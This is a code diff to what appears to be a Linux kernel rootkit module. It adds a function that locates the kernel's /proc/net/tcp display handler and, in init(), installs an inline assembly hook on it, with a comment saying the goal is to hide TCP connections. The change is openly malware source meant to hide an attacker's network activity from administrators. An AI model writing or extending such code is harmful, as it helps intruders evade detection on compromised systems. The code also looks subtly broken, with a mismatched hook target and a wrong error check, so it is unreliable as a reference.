@@ -599,6 +599,30 @@ struct file_operations *get_fop(const char *path)
     return ret;
 }
 
+
+void *get_tcp_seq_show ( const char *path )
+{
+    void *ret;
+    struct file *filep;
+    struct tcp_seq_afinfo *afinfo;
+
+    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
+        return NULL;
+
+    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+    afinfo = PDE(filep->f_dentry->d_inode)->data;
+    #elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+    afinfo = PDE_DATA(filep->f_dentry->d_inode);
+    #else
+    afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
+    #endif
+    ret = afinfo->seq_ops.show;
+
+    filp_close(filep, 0);
+
+    return ret;
+}
+
 // Macros to help reduce repeated code where only names differ.
 // Decreses risk of "copy-paste & forgot to rename" error.
 
@@ -934,6 +958,14 @@ int init(void)
     }
 
     pr_info("Comm channel is set up\n");
+	
+	
+ /* Hook /proc/net/tcp for hiding tcp4 connections */
+    //tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
+    //hijack_start(tcp4_seq_show, &n_tcp4_seq_show);
+	
+    asm_hook_create(get_tcp_seq_show("/proc/net/tcp"), get_tcp_seq_show);
+	
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
       LINUX_VERSION_CODE < KERNEL_VERSION(3, 3, 0) 
